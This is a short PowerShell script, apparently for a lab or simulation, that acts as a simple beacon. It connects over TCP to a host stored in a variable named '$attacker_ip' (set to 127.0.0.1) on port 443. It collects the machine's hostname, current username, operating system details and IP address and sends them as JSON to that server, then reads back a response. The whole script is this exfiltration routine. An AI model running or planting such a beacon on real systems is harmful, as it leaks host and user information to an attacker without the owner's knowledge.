<# 
Interact with the Network
Python Server (connect via IP address) 
#>

# Define the server IP and port
$attacker_ip = '127.0.0.1'  # Server address (use the correct server IP)
$port = 443  # The same port the server is listening on

# Create a TCP connection
$client = New-Object Net.Sockets.TcpClient($attacker_ip, $port)

# Get the data stream
$stream = $client.GetStream()

# Collect system information for simulation
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$os_info = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
$ip = (Test-Connection -ComputerName $hostname -Count 1).IPv4Address.IPAddressToString

# Build the data to send
$data = @{
    Hostname = $hostname
    Username = $username
    OS = "$($os_info.Caption) $($os_info.Version) $($os_info.OSArchitecture)"
    IPAddress = $ip
} | ConvertTo-Json -Compress

# Send the data
$sendData = [Text.Encoding]::ASCII.GetBytes($data)
$stream.Write($sendData, 0, $sendData.Length)

# (Optional) Receive response
$buffer = New-Object byte[] 1024
$bytesRead = $stream.Read($buffer, 0, $buffer.Length)
$receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
Write-Host "Received data: $receivedData"

# Close the connection
$stream.Close()
$client.Close()
